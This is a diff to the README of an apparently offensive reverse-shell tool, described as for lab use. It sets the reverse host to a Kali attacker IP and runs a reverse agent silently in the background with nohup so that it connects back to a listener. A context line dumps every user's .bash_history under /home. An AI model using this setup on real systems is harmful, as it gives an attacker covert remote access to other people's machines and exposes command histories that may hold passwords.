@@ -45,12 +45,13 @@ python3 listener.py
 Edit agent file:
 
 ```python
-REVERSE_HOST = "192.168.56.10"  # ← change to Kali IP
+REVERSE_HOST = "192.168.56.103"  # ← change to Kali IP
 ```
 
 Then run it in the background:
 
 ```bash
+pkill -f agent.py
 nohup python3 agent_reverse.py &>/dev/null &
 ```
 
@@ -107,3 +108,4 @@ find /home -name .bash_history -exec cat {} \;
 This tool is for lab use only. Do not use it on any system without explicit permission.
 
 ---
+
